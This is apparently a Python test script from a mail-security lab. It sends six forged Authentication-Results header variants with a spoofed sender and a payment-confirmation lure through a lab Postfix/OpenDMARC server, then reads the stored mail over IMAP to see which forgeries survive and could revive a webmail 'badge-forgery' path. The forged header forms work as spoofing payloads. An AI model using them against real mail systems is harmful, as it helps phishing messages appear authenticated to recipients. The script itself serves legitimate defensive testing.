"""AR survival matrix: which forged Authentication-Results forms survive the
OpenDMARC stripper and reach the mailbox. ar1 (authserv-id = our own) was
stripped; untested: foreign authserv-id, obs colon, missing id, folded forms.
If any form survives, the SnappyMail badge-forgery path revives.
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "arsurv"
EVIDENCE = "/evidence/w2-20261002a/arsurv"

AR_FORMS = {
    "b1-foreign-id": b"Authentication-Results: receiver.example; dkim=pass (2048-bit key) header.d=xn--mnchen-3ya.lab.test header.b=AAAA\r\n",
    "b2-obs-colon-own-id": b"Authentication-Results : mail.lab.test; dkim=pass (2048-bit key) header.d=xn--mnchen-3ya.lab.test\r\n",
    "b3-lower-foreign": b"authentication-results: mx.receiver.example; dkim=pass header.d=xn--mnchen-3ya.lab.test\r\n",
    "b4-no-id": b"Authentication-Results; dkim=pass header.d=xn--mnchen-3ya.lab.test\r\n",
    "b5-folded-foreign": b"Authentication-Results: receiver.example;\r\n\tdkim=pass header.d=xn--mnchen-3ya.lab.test\r\n",
    "b6-own-id-case": b"Authentication-Results: Mail.Lab.Test; dkim=pass header.d=xn--mnchen-3ya.lab.test\r\n",
}


def sh(args, timeout=90, stdin=None):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False, input=stdin)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


FETCH_SCRIPT = r'''
import imaplib, json, sys
case = sys.argv[1]
m = imaplib.IMAP4("msl-dovecot", 143)
m.login("bob", "lab-bob")
m.select("INBOX", readonly=True)
typ, data = m.search(None, "ALL")
out = {"found": False}
for item in reversed(data[0].split()):
    typ, msg = m.fetch(item, "(BODY.PEEK[HEADER.FIELDS (X-CASE-ID)])")
    blob = (msg[0][1] or b"") if msg and msg[0] else b""
    if case.encode() not in blob:
        continue
    typ, full = m.fetch(item, "(BODY.PEEK[])")
    raw = full[0][1]
    open(f"/evidence/w2-20261002a/arsurv/{case}.stored.eml", "wb").write(raw)
    ars = []
    for l in raw.split(b"\r\n"):
        if b"uthentication-results" in l.lower() or b"receiver.example" in l or b"dkim=pass" in l:
            ars.append(l.decode("utf-8", "replace").strip()[:130])
    out = {"found": True, "uid": item.decode(), "ar_like": ars}
    break
m.logout()
print(json.dumps(out))
'''


def fetch_stored(case_id: str, tries: int = 6, delay: float = 1.0):
    last = {"found": False}
    for _ in range(tries):
        code, out, _ = sh(["docker", "exec", "-i", "msl-client", "python3", "-", case_id],
                          timeout=60, stdin=FETCH_SCRIPT.encode())
        try:
            last = json.loads(out)
        except json.JSONDecodeError:
            last = {"found": False}
        if last.get("found"):
            return last
        time.sleep(delay)
    return last


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    rows = []
    for name, ar_line in AR_FORMS.items():
        case_id = "arsurv-" + name
        headers = ar_line + (
            b"From: Spoofed <author@xn--mnchen-3ya.lab.test>\r\n"
            b"To: bob@lab.test\r\n"
            b"Date: Sat, 3 Oct 2026 11:00:00 +0000\r\n"
            b"Subject: ar survival probe\r\n"
            + f"Message-ID: <{case_id}@lab.test>\r\n".encode()
            + f"X-Case-ID: {case_id}\r\n".encode()
        )
        raw = headers + b"\r\nPlease confirm the payment.\r\nCase: " + case_id.encode() + b"\r\n"
        (STAGE / f"{name}.eml").write_bytes(raw)
        code, out, err = sh([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
            "--input", f"{EVIDENCE}/{name}.eml", "--transcript", f"{EVIDENCE}/{name}.smtp.txt",
        ], timeout=60)
        try:
            sent = json.loads(out)
        except json.JSONDecodeError:
            sent = {"accepted": False, "raw": (out or err)[-150:]}
        stored = fetch_stored(case_id) if sent.get("accepted") else {"found": False}
        forged_survived = any("dkim=pass" in a and ("receiver.example" in a or "Mail.Lab.Test" in a or "Authentication-Results;" in a or "Authentication-Results :" in a) for a in stored.get("ar_like", []))
        row = {"case": name, "smtp": sent.get("reply"), "delivered": stored.get("found"),
               "ar_like": stored.get("ar_like", []), "forged_survived": forged_survived}
        rows.append(row)
        print(json.dumps({"case": name, "smtp": (row["smtp"] or "")[:20], "survived": forged_survived,
                          "ar_like": row["ar_like"][:4]}, ensure_ascii=False), flush=True)
    (STAGE / "cases.json").write_text(json.dumps({"rows": rows}, ensure_ascii=False, indent=1), encoding="utf-8")


if __name__ == "__main__":
    main()
